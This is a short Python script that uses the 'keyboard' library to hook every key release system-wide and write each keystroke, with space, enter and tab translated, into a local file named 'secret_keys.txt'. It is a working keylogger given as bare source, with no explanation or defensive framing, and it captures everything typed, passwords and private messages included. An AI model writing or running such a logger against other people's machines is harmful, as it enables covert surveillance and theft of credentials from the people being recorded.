import keyboard

out_file = open("secret_keys.txt","w")

def new_key(event):
    button = event.name
    if button == "space":
        button = " "
    elif button == "enter":
        button = "\n"
    elif button =="tab":
        button = "\t"
    out_file.write(button)
    out_file.flush()

keyboard.on_release(callback=new_key)
keyboard.wait()
